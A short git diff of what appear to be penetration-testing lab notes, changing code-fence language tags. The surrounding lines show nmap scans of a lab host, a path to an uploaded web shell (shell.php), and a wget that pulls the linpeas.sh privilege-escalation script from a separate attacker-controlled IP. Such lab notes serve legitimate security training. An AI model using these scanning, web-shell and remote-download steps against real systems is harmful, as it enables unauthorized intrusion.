@@ -994,7 +994,7 @@ https://ihsansencan.github.io/privilege-escalation/linux/binaries/capsh.html
 ```
 
 .225 (singapore) (standalone)
-```
+```bash
 nmap 192.168.248.225
 sudo nmap -sU --open -p 161 192.168.248.225
 sudo nmap -p- -Pn 192.168.248.225 -sS -T 5 --verbose
@@ -1033,7 +1033,7 @@ http://192.168.248.225:8090/backend/default/uploads/shell.php
 ```
 
 .225 privesc
-```
+```bash
 wget http://192.168.45.160/linpeas.sh -O linpeas.sh
 
 # this produces a bash one-liner
